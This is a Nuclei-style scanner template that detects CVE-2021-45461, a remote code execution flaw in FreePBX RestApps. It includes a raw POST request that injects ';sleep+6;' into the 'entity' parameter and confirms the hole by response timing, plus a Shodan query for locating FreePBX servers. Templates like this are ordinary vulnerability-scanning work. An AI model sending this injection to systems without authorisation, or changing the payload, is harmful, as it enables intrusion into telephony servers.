id: CVE-2021-45461

info:
  name: FreePBX RestApps - Remote Code Execution
  author: Ani-4x
  severity: critical
  description: |
    FreePBX restapps module allows remote attackers to execute arbitrary code via the 'entity' parameter in 'restapps.php' due to improper input sanitization. This exploit injects shell commands into the 'entity' field.
  reference:
    - https://community.freepbx.org/t/0-day-freepbx-exploit/80092
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45461
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-45461
    cwe-id: CWE-78
  metadata:
    max-request: 1
    shodan-query: http.title:"FreePBX"
    verified: true
  tags: cve,cve2021,freepbx,rce,restapps,intrusive

http:
  - raw:
      - |
        POST /restapps/restapps.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        application=presencestate&command=list&entity=;sleep+6;

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"